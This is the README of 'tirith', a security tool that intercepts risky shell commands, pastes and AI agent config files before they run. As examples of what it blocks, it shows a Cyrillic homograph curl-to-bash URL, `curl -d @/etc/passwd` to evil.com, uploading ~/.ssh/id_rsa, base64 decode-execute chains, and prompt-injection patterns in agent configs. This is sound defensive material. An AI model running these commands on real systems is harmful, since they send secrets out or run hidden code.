# tirith

**Your browser would catch this. Your terminal won't.**

<p align="center">
  <img src="assets/cover.png" alt="tirith — terminal security" width="100%" />
</p>

[![CI](https://github.com/sheeki03/tirith/actions/workflows/ci.yml/badge.svg)](https://github.com/sheeki03/tirith/actions/workflows/ci.yml)
[![GitHub Stars](https://img.shields.io/github/stars/sheeki03/tirith?style=flat&logo=github)](https://github.com/sheeki03/tirith/stargazers)
[![License: AGPL-3.0](https://img.shields.io/badge/license-AGPL--3.0-blue)](LICENSE-AGPL)

[Website](https://tirith.sh) | [Docs](https://tirith.sh/docs) | [SKILL.md](SKILL.md) | [Changelog](https://github.com/sheeki03/tirith/releases)

---

Can you spot the difference?

```
  curl -sSL https://install.example-cli.dev | bash     # safe
  curl -sSL https://іnstall.example-clі.dev | bash     # compromised
```

You can't. Neither can your terminal. Both `і` characters are Cyrillic (U+0456), not Latin `i`. The second URL resolves to an attacker's server. The script executes before you notice.

Browsers solved this years ago. Terminals still render Unicode, ANSI escapes, and invisible characters without question. AI agents run shell commands and install packages without inspecting what's inside.

**Tirith stands at the gate.** It intercepts commands, pasted content, and scanned files for homograph URLs, obfuscated payloads, credential exfiltration, malicious AI skills/configs, and known-bad packages/domains/IPs from a signed threat intelligence database before they execute.

```bash
# Homebrew 6.0.0+ trusts just this formula via the fully-qualified name.
brew install sheeki03/tap/tirith
```

Then activate in your shell profile:

```bash
# zsh
eval "$(tirith init --shell zsh)"

# bash
eval "$(tirith init --shell bash)"

# fish
tirith init --shell fish | source
```

> [!TIP]
> `eval "$(tirith init)"` auto-detects your current shell (it inspects the parent process and falls back to `$SHELL` if needed). The explicit `--shell` flag is only required when you want to override the detection.

That's it. Every command you run is now guarded. Zero friction on clean input. Sub-millisecond overhead. You forget it's there until it saves you.

Also available via [npm](#cross-platform), [cargo](#cross-platform), [mise](#cross-platform), [apt/dnf](#linux-packages), and [more](#install).

---

## See it work

**Homograph attack — blocked before execution:**

```
$ curl -sSL https://іnstall.example-clі.dev | bash

tirith: BLOCKED
  [CRITICAL] non_ascii_hostname — Cyrillic і (U+0456) in hostname
    This is a homograph attack. The URL visually mimics a legitimate
    domain but resolves to a completely different server.
  Bypass: prefix your command with TIRITH=0 (applies to that command only)
```

The command never executes.

**Pipe-to-shell with clean URL — warned, not blocked:**

```
$ curl -fsSL https://get.docker.com | sh

tirith: WARNING
  [MEDIUM] pipe_to_interpreter — Download piped to interpreter
    Consider downloading first and reviewing.
```

Warning prints to stderr. Command still runs.

**Base64 decode-execute chain — blocked:**

```
$ echo payload | base64 -d | bash

tirith: BLOCKED
  [HIGH] base64_decode_execute — Base64 decode piped to interpreter
  [HIGH] pipe_to_interpreter — Pipe to interpreter: base64 | bash
```

Catches decode chains through sudo/env wrappers and PowerShell `-EncodedCommand` too.

**Credential exfiltration — blocked:**

```
$ curl -d @/etc/passwd https://evil.com/collect

tirith: BLOCKED
  [HIGH] data_exfiltration — Data exfiltration via curl upload
    curl command uploads sensitive data to a remote server
```

Covers all curl/wget upload flags, env vars (`$AWS_SECRET_ACCESS_KEY`), and command substitution.

**Malicious skill file — caught on scan:**

```
$ tirith scan evil_skill.py

tirith scan: evil_skill.py — 3 finding(s)
  [MEDIUM] dynamic_code_execution — exec() near b64decode() in close proximity
  [MEDIUM] obfuscated_payload — Long base64 string decoded and executed
  [MEDIUM] suspicious_code_exfiltration — HTTP call passes sensitive data as argument
```

Scans JS/Python files for obfuscated payloads, dynamic code execution, and secret exfiltration patterns.

**Normal commands — invisible:**

```
$ git status
$ ls -la
$ docker compose up -d
```

Nothing. Zero output. You forget tirith is running.

---

## What it catches

**110+ detection rules across 16 categories.**

| Category | What it stops |
|----------|--------------|
| **Homograph attacks** | Cyrillic/Greek lookalikes in hostnames, punycode domains, mixed-script labels, lookalike TLDs, confusable domains, text-level confusable detection (math alphanumerics, same-word mixed-script) |
| **Terminal injection** | ANSI escape sequences, bidi overrides, zero-width characters, unicode tags, invisible math operators, variation selectors, Hangul fillers |
| **Steganography defense** | Invisible whitespace encoding (12 Unicode space variants), Mongolian Vowel Separator, Hangul Filler characters, math alphanumeric substitution — defenses against st3gg-style text steganography |
| **Pipe-to-shell** | `curl \| bash`, `wget \| sh`, `httpie \| sh`, `xh \| sh`, `python <(curl ...)`, `eval $(wget ...)` — every source-to-sink pattern |
| **Base64 decode-execute** | `base64 -d \| bash`, `python -c "exec(b64decode(...))"`, `powershell -EncodedCommand` — decode chains through sudo/env wrappers |
| **Data exfiltration** | `curl -d @/etc/passwd`, `curl -T ~/.ssh/id_rsa`, `wget --post-file`, env var uploads (`$AWS_SECRET_ACCESS_KEY`), command substitution exfil |
| **Code file scanning** | Obfuscated payloads (`eval(atob(...))`), dynamic code execution (`exec(b64decode(...))`), secret exfiltration via `fetch`/`requests.post` in JS/Python files |
| **Credential detection** | AWS keys, GitHub PATs, Stripe/Slack/SendGrid/Anthropic/GCP/npm tokens, private key blocks, plus entropy-based generic secret detection |
| **Post-compromise behavior** | Process memory scraping (`/proc/*/mem`), Docker remote privilege escalation, credential file sweeps — calibrated against TeamPCP and UNC1069 post-compromise tooling |
| **Command safety** | Dotfile overwrites, archive extraction to sensitive paths, cloud metadata endpoint access, private network access |
| **Insecure transport** | Plain HTTP piped to shell, `curl -k`, disabled TLS verification, shortened URLs hiding destinations |
| **Environment** | Proxy hijacking, sensitive env exports, code injection via env, interpreter hijack, shell injection env |
| **Config file security** | Config injection, suspicious indicators, non-ASCII/invisible unicode in configs, MCP server security (insecure/untrusted/duplicate/permissive) |
| **Ecosystem threats** | Git clone typosquats, untrusted Docker registries, pip/npm URL installs, web3 RPC endpoints, vet-not-configured |
| **Install-command safety** | APT repos added from a piped download, `[trusted=yes]` / `--allow-unauthenticated` / `--nogpgcheck` / pacman `SigLevel = Never` (disabled signature checks), `kubectl apply -f` against raw/shortened remote manifests, Helm charts from untrusted repos, Terraform modules from untrusted remote sources, `brew install`/`tap` from arbitrary URLs |
| **Path analysis** | Non-ASCII paths, homoglyphs in paths, double-encoding |
| **Rendered content** | Hidden CSS/color content, hidden HTML attributes, comment content analysis (prompt injection at High, destructive commands at Medium) |
| **Cloaking detection** | Server-side cloaking (bot vs browser), clipboard hidden content, PDF hidden text |

---

## What tirith does NOT protect against

Tirith analyzes the **structure** of commands, pasted text, and files *before*
they execute. It is a pre-execution gate, not a runtime defense. By design, it
does not cover:

- **Runtime sandboxing** — tirith does not sandbox or contain a command once it
  runs. It decides whether to warn or block; it does not isolate execution.
- **Post-execution network monitoring** — tirith does not inspect network
  traffic after a command runs. What a process does on the network once
  launched is out of scope.
- **Malware / payload detection** — tirith analyzes command and file
  *structure*, not payload behavior. It is not an antivirus and does not
  detonate or signature-match payloads. (`tirith run` analyzes a downloaded
  script's structure before execution, but it is still not malware analysis.)
- **A privileged root/admin attacker** — a user who is already root or admin can
  bypass tirith trivially. Tirith defends against tricked input, not against an
  attacker who already owns the machine.
- **Anti-debugging / anti-tampering** — tirith does not resist analysis or
  reverse engineering, and does not protect its own binary from a local
  attacker.

See [docs/threat-model.md](docs/threat-model.md) for the full threat model and
explicit non-goals.

---

## Known limitations

- **Shell-hook fragility** — tirith protection depends on a shell hook staying
  correctly installed and active. Hooks can break or silently degrade across
  shells (zsh, bash, fish, PowerShell), shell versions, prompt frameworks, and
  history tools. Run `tirith doctor` to check live hook state, and watch for
  warn-only degradation messages.
- **Unix-only features** — daemon mode and `tirith setup` are Unix-only today.
  `tirith run` and `tirith fetch` are likewise Unix-only.
- **Package-name extraction scope** — package-name matching against the threat
  database covers language ecosystems (pip, npm/yarn/pnpm/bun, cargo, gem, go,
  composer, dotnet, mvn/gradle). It does **not** cover distro-level package
  managers (`apt`, `dnf`, `yum`, `pacman`).
- **AI-agent integration caveats** — shell-hook interception only guards
  commands that actually go through a hooked interactive shell; an agent that
  spawns a non-interactive shell, calls `exec` directly, or runs in an
  environment where the hook is not loaded is not covered. MCP-based protection
  requires the agent to actually call the tirith MCP tools — it is advisory, not
  enforced.

---

## Threat intelligence

Tirith ships a signed local threat database for package, hostname, and IP reputation. When a shell hook or `tirith check` sees a package install or suspicious infrastructure reference, it matches that input against the database before the command executes, instead of relying only on static heuristics.

**Signed DB** (built daily by CI, verified on download and load):

- Known-malicious packages from [OpenSSF Malicious Packages](https://github.com/ossf/malicious-packages) and [Datadog Security Labs](https://github.com/DataDog/malicious-software-packages-dataset)
- Malicious IP infrastructure from [Feodo Tracker](https://feodotracker.abuse.ch/) (abuse.ch)
- Confirmed typosquats and popular-package baselines from [ecosyste.ms](https://ecosyste.ms/)
- [CISA Known Exploited Vulnerabilities](https://www.cisa.gov/known-exploited-vulnerabilities-catalog) catalog for runtime advisory correlation

**Optional supplemental feeds** (user-local overlay):

- [URLhaus](https://urlhaus.abuse.ch/) and [ThreatFox](https://threatfox.abuse.ch/) via an abuse.ch auth key
- [PhishTank](https://phishtank.org/) (Cisco Talos) and [Phishing Army](https://phishing.army/) blocklists
- Tor exit node list from [Tor Project](https://www.torproject.org/)

**Optional live enrichment** during `tirith check` and daemon mode:

- [OSV.dev](https://osv.dev/) advisory lookups (Google OSS)
- [deps.dev](https://deps.dev/) package health signals (Google OSS) and [ecosyste.ms](https://ecosyste.ms/) maintainer data
- [Google Safe Browsing](https://safebrowsing.google.com/) URL reputation with your own API key

```bash
tirith threat-db update              # download + verify the signed DB
tirith threat-db status              # age, signature, version, entry counts
tirith threat-db health              # install, signature, staleness, counts
tirith threat-db sources             # list every feed the DB is built from
tirith threat-db explain react       # what the DB knows about an indicator
tirith threat-db diff --since 2026-01-01   # count changes since a version/date
```

By default, shell hooks and `tirith check` trigger a cheap background refresh check every 24 hours. Daemon mode keeps the same enrichment path warm in the background.

`threat-db explain` accepts a domain, a package name (`name`, `ecosystem:name`, or `name@version`), or an IPv4 address; `threat-db sources` groups feeds into the signed primary database and the optional user-local supplemental overlay. The threat-DB binary retains no per-entry history, so `threat-db diff` reports category and per-source count deltas between snapshots rather than the exact entries added or removed. Every `threat-db` command takes `--format json`; `threatdb` works as an alias for `threat-db`.

### Package risk scoring

`tirith package risk <ecosystem> <name>` scores a package's supply-chain / maintainer risk the way `tirith score` scores a URL — a **deterministic, fully explainable sum of named factors**, no model and no learned weights. `tirith package explain <ecosystem> <name>` adds the factor-by-factor derivation; both take `--format json`.

```bash
tirith package risk npm react           # 0/100 — a known-popular package
tirith package risk npm reqeusts        # high — one edit from a popular name
tirith package explain pypi flask       # factor-by-factor derivation
tirith package risk npm left-pad --path ./node_modules/left-pad
tirith package risk --online npm react  # also consult the registry API
```

**Offline by default.** With no flags, every signal is computed locally with **no network call**: (1) **name vs. popular packages** — whether the name is a known-popular package, an unknown name, or a one-edit near-miss of a popular one (the classic typosquat/slopsquat shape), from the local threat database's `popular` set; (2) **known malicious typosquat** — whether the threat DB's `typosquat` index lists the exact name; (3) **install / lifecycle scripts** and (4) **bundled binary blobs** — detected *only* when the package content is locally available (auto-discovered under `node_modules` / `site-packages`, or an explicit `--path`) — tirith **never downloads** the package.

**`--online` adds registry-API provenance signals.** With `--online`, `package risk` additionally consults the package's registry API — the npm registry, the PyPI JSON API, or the crates.io API, selected by ecosystem — for six more factors, each an explicit named term in the *same* deterministic factor-sum model: package / version age, an established package the registry lists with no owners at all, an abnormal version-number spike, very low download counts, a missing source-repository URL, and yanked / deprecated status. `--online` is the **only** path on which `package risk` reaches the network — never the `check` hot path — and `--offline` / `TIRITH_OFFLINE` force offline even with `--online`. A network or registry failure degrades gracefully to the offline score with an honest `api signals: unavailable`, and successful responses are cached on disk with a TTL so repeated runs do not hammer the registries.

The score is advisory and standalone: `package risk` is not a detection rule and changes no verdict, exit code, or audit log.

### Ecosystem scan — supply-chain firewall

`tirith ecosystem scan [path]` is the directory-level companion to `package risk`. It walks a project, discovers every dependency manifest it understands — npm (`package.json`, `package-lock.json`), Python (`requirements*.txt`, `pyproject.toml`), Rust (`Cargo.toml`), Go (`go.mod`), Ruby (`Gemfile`) — and scores **every declared dependency** with the same deterministic `package_risk` factor engine.

```bash
tirith ecosystem scan                       # scan the current project
tirith ecosystem scan ./my-project          # scan a specific directory
tirith ecosystem scan --online ./my-project # also consult the registry API
tirith ecosystem scan --format json ./      # full machine-readable report
```

**It folds in slopsquat detection.** *Slopsquatting* is the registration of a plausible-but-fake package name that LLMs tend to hallucinate when asked to suggest a dependency. `ecosystem scan` flags a dependency as slopsquat-suspicious only when **all three** hold: the name is not a known-real / known-popular package, it is **name-shaped like an AI hallucination** (a language prefix such as `python-` / `node-` plus descriptive tokens, a stack of generic filler words like `helper` / `utils` / `client`, or an unusually long descriptive name), **and** it sits near a real popular name (a one-edit near-miss, or it embeds a popular package name as a word). Requiring all three keeps the false-positive rate low — an honest `data-utils` with no popular anchor does not fire.

**Offline by default, opt-in `--online`.** Name and typosquat signals come from the local threat database; `--online` adds the registry-API provenance signals, gated and degraded exactly as `package risk --online` is — never on the `check` hot path. Findings flow through tirith's normal `Verdict` / `Finding` model: they are explainable (`tirith explain --rule threat_suspicious_package`), audit-logged, and respect the policy allowlist (an allowlisted package — by bare name or `ecosystem:name` — is suppressed). Exit codes match `tirith scan`: `1` for a blocking finding (a confirmed-malicious / typosquat dependency), `2` for advisory findings, `0` when clean.

This helps catch known-malicious packages, confirmed typosquats, slopsquatted package names, malicious download infrastructure, and packages with live OSV / CISA KEV advisory data.

**Attack families tirith is built for** (illustrative, not a caught-by-current-code claim):

| Incident | Year | Attack shape |
|---|---|---|
| [Shai-Hulud npm worm](https://socket.dev/blog/shai-hulud-worm) | 2025 | Self-propagating package malware; exfiltrated GitHub tokens and AWS keys from 180+ packages, published findings to public `Shai-Hulud` repos |
| [Slopsquatting](https://socket.dev/blog/slopsquatting-how-ai-hallucinations-are-fueling-a-new-class-of-supply-chain-attacks) | 2023–ongoing | Attackers register LLM-hallucinated package names on npm / PyPI / crates.io; [USENIX 2025](https://www.usenix.org/system/files/conference/usenixsecurity25/sec25cycle1-prepub-742-spracklen.pdf) found 58% of hallucinated names repeat across runs |
| Team PCP / UNC1069 tooling | ongoing | Post-compromise credential sweeps, `/proc/*/mem` scraping, Docker privilege escalation |
| [colors.js / faker.js sabotage](https://snyk.io/blog/open-source-npm-packages-colors-faker/) | 2022 | Author self-sabotage of widely-used packages |
| [event-stream compromise](https://github.com/dominictarr/event-stream/issues/116) | 2018 | Transferred ownership to attacker; payload targeted Bitcoin wallets |

Package-name extraction currently covers language ecosystems (pip, npm/yarn/pnpm/bun, cargo, gem, go, composer, dotnet, mvn/gradle), not distro-level package managers (`apt` / `dnf` / `yum` / `pacman`). That's why xz-utils, which entered through Linux distro tarballs, is not in the table despite being a headline incident.

---

## AI agent security

Tirith protects AI coding agents at every layer — from the configs they read to the commands they execute.

### Shell hooks — passive command interception

When AI agents execute shell commands (Claude Code, Codex, Cursor, etc.), tirith's shell hooks intercept every command before it runs. No agent-side configuration needed — if the hook is active in the shell, all commands are guarded:

- **Blocks dangerous commands** — homograph URLs, pipe-to-shell, insecure downloads
- **Blocks malicious paste** — ANSI injection, bidi attacks, hidden multiline in pasted content
- **Works with every agent** — any tool that spawns a shell inherits tirith protection
- **Zero agent modification** — the agent doesn't know tirith exists until a command is blocked

Use `tirith setup <tool>` for one-command configuration (see [AI Agent Integrations](#ai-agent-integrations)).

### MCP server (7 tools)

Run `tirith mcp-server` or use `tirith setup <tool> --with-mcp` to register tirith as an MCP server. AI agents can call these tools before taking action:

| Tool | What it does |
|------|-------------|
| `tirith_check_command` | Analyze shell commands for pipe-to-shell, homograph URLs, env injection |
| `tirith_check_url` | Score URLs for homograph attacks, punycode tricks, shortened URLs, raw IPs |
| `tirith_check_paste` | Check pasted content for ANSI escapes, bidi controls, zero-width chars |
| `tirith_scan_file` | Scan a file for hidden content, invisible Unicode, config poisoning |
| `tirith_scan_directory` | Recursive scan with AI config file prioritization |
| `tirith_verify_mcp_config` | Validate MCP configs for insecure servers, shell injection in args, wildcard tools |
| `tirith_fetch_cloaking` | Detect server-side cloaking (different content for bots vs browsers) |

### MCP server governance

`tirith mcp lock` captures every MCP server a repository declares — across `.mcp.json` / `mcp.json` / `mcp_settings.json` and the IDE config variants (`.vscode/`, `.cursor/`, `.windsurf/`, `.cline/`, `.amazonq/`, `.continue/`, `.kiro/`) — into a deterministic lockfile at `.tirith/mcp.lock`. Each server is recorded with its transport (a remote URL, or a local command + args), declared tools, and a content hash; servers are sorted by name so the lockfile is diff-friendly. Discovery is repo-local only and touches no network. (`tirith mcp` is a separate command group from `tirith mcp-server`, which runs tirith *as* an MCP server.)

`tirith mcp verify` is the gating companion: it loads the committed lockfile, rebuilds the current inventory, and exits 1 when the two differ (0 when they match, 2 on a usage error such as a missing lockfile). `tirith mcp diff` shows the same drift informationally — it exits 0 whether or not drift is present (drift is reported, not enforced), but a usage error (missing lockfile, unreadable lockfile, unresolvable repo root) still exits 2 so a piped consumer can distinguish "no drift" from "I could not check". Drift is also surfaced through `tirith scan` as the `mcp_server_drift` rule (Severity Medium), so a pre-commit hook or CI integration catches an MCP-surface change the same way it catches an un-pinned action. Env values and URL userinfos are never printed by `verify` / `diff` — only the names of the variables / credentials that changed.

Two policy fields govern which servers and tools are accepted: `scan.trusted_mcp_servers` lists server names whose per-server MCP config findings are suppressed and whose drift is silenced, and `scan.mcp_allowed_tools` declares, per server, the exact tools the server may expose — a tool that lands in the lockfile outside that set surfaces a High-severity `mcp_server_drift` finding, and drift that adds a tool outside the set upgrades from Medium to High. `tirith mcp policy init` scaffolds a starter version of both blocks from the current lockfile into `.tirith/mcp-policy.yaml.example`, with every entry commented out so importing the example never silently widens trust.

### Config file scanning

`tirith scan` detects prompt injection and hidden payloads in AI config files. It prioritizes and scans 50+ known AI config file patterns:

- `.cursorrules`, `.windsurfrules`, `.clinerules`, `CLAUDE.md`, `copilot-instructions.md`
- `.claude/` settings, agents, skills, plugins, rules
- `.cursor/`, `.vscode/`, `.windsurf/`, `.cline/`, `.continue/`, `.roo/`, `.codex/` configs
- `mcp.json`, `.mcp.json`, `mcp_settings.json`
- `.github/copilot-instructions.md`, `.github/agents/*.md`

**What it catches in configs:**

- **Prompt injection** — skill activation triggers, permission bypass attempts, safety dismissal, identity reassignment, cross-tool override instructions
- **Invisible Unicode** — zero-width characters (including Mongolian Vowel Separator), bidi controls, soft hyphens, Unicode tags, Hangul fillers, invisible whitespace encoding, math alphanumeric confusables
- **MCP config issues** — insecure HTTP connections, raw IP servers, shell metacharacters in args, duplicate server names, wildcard tool access

### CI / repo supply-chain scanning

`tirith scan` also inspects the files a repository checks in to describe its own build and deploy pipeline. It detects the dangerous *pattern*, not the tool — a SHA-pinned action, a digest-pinned image, a local Terraform module, and a normal `package.json` stay clean.

**What it catches in CI / infrastructure files:**

- **GitHub Actions workflows** (`.github/workflows/*.yml`) — an action `uses:` reference pinned to a mutable ref (`@v3`, `@main`) instead of a commit SHA; the `pull_request_target` trigger; a `curl … | bash` pipe-to-shell in a `run:` step; an attacker-controllable `${{ github.event.* }}` value interpolated into a `run:` shell step (script injection)
- **Dockerfiles** — a `FROM` base image on the mutable `latest` tag (or no tag) with no `@sha256:` digest pin
- **Terraform** (`*.tf`) — a `module` block sourced from a remote / untrusted location rather than a local path or the Terraform Registry
- **Helm charts** (`Chart.yaml`) — a chart dependency from an untrusted chart repository
- **`package.json`** — a `preinstall` / `install` / `postinstall` lifecycle script that runs a dangerous command (pipe-to-shell, obfuscated payload, download-and-run); these hooks run automatically on `npm install`

Three built-in `--profile` values tune the scan: `ci-hardening` (every check at full strength, fail-on `high`), `ai-agent-repo` (keeps injection findings, drops low-value pinning-hygiene noise), and `oss-maintainer` (emphasises contributor-controllable risk when reviewing a change).

```bash
tirith scan ./                          # scan the repo
tirith scan --profile ci-hardening ./   # tune for CI/CD hardening
tirith scan --format sarif ./ > out.sarif
```

### Hidden content detection

Detects content invisible to humans but readable by AI in HTML, Markdown, and PDF:

- **CSS hiding** — `display:none`, `visibility:hidden`, `opacity:0`, `font-size:0`, off-screen positioning
- **Color hiding** — white-on-white text, similar foreground/background (contrast ratio < 1.5:1)
- **HTML/Markdown comments** — prompt injection phrases (High), destructive commands like `rm -rf` or `curl|bash` (Medium), long comments hiding instructions (Low)
- **PDF hidden text** — sub-pixel rendered text (font-size < 1px) invisible to readers but parseable by LLMs

### AI-relevant file hidden-content scanning

`tirith scan` also inspects file types an AI coding agent (or a renderer) reads and acts on, looking for content **smuggled past a human reviewer**. A normal notebook, an ordinary `CLAUDE.md` with visible instructions, and a plain SVG image stay clean — only hidden / smuggled content fires.

- **Jupyter notebooks** (`*.ipynb`) — invisible / bidi / zero-width characters in cell source, a base64-encoded blob embedded in source, a cell hidden from the rendered view (`metadata.jupyter.source_hidden` / a `hide_input` tag), and cell *outputs* carrying invisible characters or active / hidden HTML
- **AI agent-instruction files** (`CLAUDE.md`, `AGENTS.md`, `.cursorrules`, and similar) — *hidden* directives only: an instruction inside an HTML comment (invisible in rendered Markdown) or a visually-hidden HTML element. These files legitimately contain visible instructions, so ordinary visible instructions never fire
- **SVG images** (`*.svg`) — an embedded `<script>`, an inline `on*` event handler, a `javascript:` URI, a remote `xlink:href` / `href`, or an XXE external-entity declaration

### Cloaking detection

`tirith fetch` compares server responses across 6 user-agents (Chrome, ClaudeBot, ChatGPT-User, PerplexityBot, Googlebot, curl) to detect when servers serve different content to AI bots vs browsers.

---

## Install

### macOS

**Homebrew:**

```bash
# Direct install: the full name trusts just this formula (Homebrew 6.0.0+).
brew install sheeki03/tap/tirith

# Already tapped and installing/upgrading by the short name? Trust it first:
brew trust --formula sheeki03/tap/tirith
brew upgrade tirith
```

Homebrew 6.0.0 (June 2026) requires third-party taps to be trusted before it
loads their Ruby. A fully-qualified `brew install sheeki03/tap/tirith` trusts
just this formula as part of the install, so the one-liner needs nothing extra.
You only need `brew trust` if you install or upgrade by the short `tirith` name,
or to silence the "tap is not trusted" warning that `brew update` prints for an
untrusted tap. `brew trust sheeki03/tap` trusts the whole tap.

### Linux Packages

**Debian / Ubuntu (.deb):**

Download from [GitHub Releases](https://github.com/sheeki03/tirith/releases/latest), then:

```bash
sudo dpkg -i tirith_*_amd64.deb
```

**Fedora / RHEL / CentOS 9+ (.rpm):**

Download from [GitHub Releases](https://github.com/sheeki03/tirith/releases/latest), then:

```bash
sudo dnf install ./tirith-*.rpm
```

**Arch Linux (AUR):**

```bash
yay -S tirith
# or: paru -S tirith
```

**Nix:**

```bash
nix profile install nixpkgs#tirith              # from nixpkgs
nix profile install github:sheeki03/tirith      # from upstream flake
# or try without installing: nix run github:sheeki03/tirith -- --version
```

### Android (Termux)

Android/Termux runs on Bionic libc, not glibc, so the `aarch64-unknown-linux-gnu`
build cannot run there — it needs glibc's dynamic linker. Use the **musl** build
instead: `tirith-aarch64-unknown-linux-musl.tar.gz` is statically linked and runs
on Termux without an external libc.

```bash
# In Termux:
pkg install curl tar
# Download the musl build from the latest GitHub release:
curl -fsSL -o tirith.tar.gz \
  https://github.com/sheeki03/tirith/releases/latest/download/tirith-aarch64-unknown-linux-musl.tar.gz
tar xzf tirith.tar.gz
install -Dm755 tirith "$PREFIX/bin/tirith"
tirith --version
```

Then activate the shell hook in `~/.bashrc` (Termux's default shell is bash):

```bash
eval "$(tirith init --shell bash)"   # add to ~/.bashrc
```

> [!NOTE]
> Termux support is best-effort. The musl artifact is built and smoke-tested in
> CI, but tirith is not yet continuously tested on a real Android device.
> If a hook misbehaves under Termux, please open an issue with `tirith doctor`
> output.

### Windows

All core features work on Windows including detection, scanning, webhooks, policy management, and audit uploads. Shell hooks support PowerShell. Daemon mode and `tirith setup` are Unix-only for now.

**Scoop:**

```powershell
scoop bucket add tirith https://github.com/sheeki03/scoop-tirith
scoop install tirith
```

**Chocolatey** (under moderation — pending approval):

```powershell
choco install tirith
```

### Cross-Platform

**npm:**

```bash
npm install -g tirith
```

**Cargo:**

```bash
cargo install tirith
```

**[Mise](https://mise.jdx.dev/)** (official registry):

```bash
mise use -g tirith
```

**asdf:**

```bash
asdf plugin add tirith https://github.com/sheeki03/asdf-tirith.git
asdf install tirith latest
asdf global tirith latest
```

**Docker:**

```bash
docker run --rm ghcr.io/sheeki03/tirith check -- "curl https://example.com | bash"
```

### Activate

Add to your shell profile (`.zshrc`, `.bashrc`, or `config.fish`):

```bash
eval "$(tirith init --shell zsh)"   # in ~/.zshrc
eval "$(tirith init --shell bash)"  # in ~/.bashrc
tirith init --shell fish | source   # in ~/.config/fish/config.fish
```

| Shell | Hook type | Tested on |
|-------|-----------|-----------|
| zsh | preexec + paste widget | 5.8+ |
| bash | preexec (two modes) | 5.0+ |
| fish | fish_preexec event | 3.5+ |
| PowerShell | PSReadLine handler | 7.0+ |

Bash uses enter mode when a capability self-test has proven it works for your bash, and preexec otherwise. `tirith setup` / `tirith doctor` run the self-test; the shell hook reads its cached verdict at startup. See [troubleshooting](docs/troubleshooting.md#bash-enter-mode-vs-preexec-mode) for details on the modes, the self-test, and SSH fallback behavior.

> [!WARNING]
> Bash's preexec mode warns but cannot block in-place. Set `TIRITH_BASH_PREEXEC_ENFORCE=1` for real blocking via `shopt -s extdebug`. Enforcement refuses to activate when `HISTCONTROL` contains `ignorespace` / `ignoredups` / `ignoreboth`, any `HISTIGNORE` is set, or `set +o history` is active — those make the block racy.

#### Enforcement by shell

| Shell | Behavior |
|---|---|
| bash **enter mode** | **Reliable blocking.** Binds Enter; can stop a command before bash commits to running it. Used by default only where a capability self-test (`tirith doctor --simulate-enter`) has proven `bind -x` delivery works for the running bash. |
| bash **preexec + `TIRITH_BASH_PREEXEC_ENFORCE=1`** | **Conditional blocking.** Uses `shopt -s extdebug`; blocks when bash's `history` can provide a trustworthy whole-line view. Downgrades to warn-only when history is filtered (`HISTCONTROL=ignorespace/ignoredups/ignoreboth`, any `HISTIGNORE`, or `set +o history`) or an alias / command substitution / `eval` makes the typed line drift from `BASH_COMMAND`. |
| bash **preexec** (no enforce flag) | Warn-only. Prints a DETECTED banner on risky commands; does not block. The fallback when the enter-mode self-test has not proven delivery works. |
| zsh, fish, powershell | Reliable blocking via native preexec hooks. |
| nushell | Warn-only (does not currently support command interception). |

For guaranteed line-level blocking on bash, run `tirith doctor --simulate-enter` — if delivery works, enter mode is enabled. Where it does not, use preexec enforce for "blocks when possible; tells you honestly when it can't."

**Nix / Home-Manager:** tirith must be in your `$PATH` — the shell hooks call `tirith` by name at runtime. Adding it to `initContent` alone is not enough.

```nix
home.packages = [ pkgs.tirith ];

programs.zsh.initContent = ''
  eval "$(tirith init --shell zsh)"
'';
```

### Updating and verifying tirith

tirith can verify its own integrity and update itself. Both commands reach the network only when you run them.

```bash
tirith verify-self          # is this binary the genuine, unmodified release?
tirith update               # update to the latest release
tirith version --provenance # version, build info, install method, verification
```

**`tirith verify-self`** confirms the running binary is the genuine, unmodified binary from an official release. It re-downloads the release archive for your version and target, verifies it against the signed release `checksums.txt`, verifies the cosign signature over `checksums.txt` when [`cosign`](https://github.com/sigstore/cosign) is installed, and confirms the running binary is byte-identical to the official one. If full verification is not possible — a local dev build, no network, an install tirith cannot identify — it says so honestly rather than reporting a false "verified". With `cosign` absent the checksum is still verified (reported as `verified-checksum-only`); install `cosign` for full signature verification (`verified-signed`).

**`tirith update`** is package-manager-aware:

- **Package-manager installs** (Homebrew, cargo, npm, Scoop, AUR, apt/dnf) are never self-modified. tirith prints the exact command to run instead — e.g. `brew upgrade tirith`. Updating through the package manager keeps its database consistent.
- **Self-managed installs** (the `install.sh` tarball, or a standalone binary) are updated in place: tirith downloads the latest release, verifies it, then atomically swaps the binary, keeping the previous one as a `tirith.tirith-previous` sidecar. The cosign signature is verified by **default**: if it cannot be verified (cosign missing, or the release published no signature) the update aborts. Pass `--allow-unsigned` to fall back to checksum-only verification; a checksum mismatch always aborts regardless. `tirith update --rollback` reverts to the previous binary; `--dry-run` shows what would happen without changing anything.

> [!NOTE]
> The install scripts (`scripts/install.sh` and the Windows `install.ps1`) also verify the release's cosign signature by **default** and abort if [`cosign`](https://github.com/sigstore/cosign) is missing or the signature cannot be verified. Install `cosign` first, or set `TIRITH_ALLOW_UNSIGNED=1` to install with checksum-only verification (not recommended). A checksum or signature mismatch always aborts regardless of this opt-out.

### Shell Integrations

**Oh-My-Zsh:**

```bash
git clone https://github.com/sheeki03/ohmyzsh-tirith \
  ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/tirith

# Add tirith to plugins in ~/.zshrc:
plugins=(... tirith)
```

### AI Agent Integrations

Use `tirith setup <tool>` for one-command configuration:

```bash
tirith setup claude-code --with-mcp   # Claude Code + MCP server
tirith setup codex                    # OpenAI Codex
tirith setup copilot-cli              # GitHub Copilot CLI (run from repo root)
tirith setup cursor                   # Cursor
tirith setup gemini-cli --with-mcp    # Gemini CLI + MCP server
tirith setup kiro                     # Kiro CLI (formerly Amazon Q)
tirith setup pi-cli                   # Pi CLI
tirith setup vscode                   # VS Code
tirith setup windsurf                 # Windsurf
```

For manual configuration, see `mcp/clients/` for per-tool guides.

### CI/CD Integration

**GitHub Action** with SARIF upload to GitHub Security tab:

```yaml
- uses: sheeki03/tirith@v1
  with:
    fail_on: high
    sarif: true
```

Also available as a **pre-commit hook** — see `.pre-commit-hooks.yaml` in this repo.

Scan supports `--include`, `--exclude`, `--profile` (loads named profiles from policy), and `--ignore` filters for targeted CI scanning.

### Rule Documentation

```bash
tirith explain --rule pipe_to_interpreter   # severity, examples, remediation, MITRE ATT&CK
tirith explain --rule curl_pipe_shell --fix # just the remediation ("what to do instead")
tirith explain --list --category terminal   # all rules in a category
```

### Remediation — "what to run instead"

Every finding carries a per-rule remediation: a short, accurate "how to make
this safe" line, shown under each finding (`Fix:`) and in `--format json`.
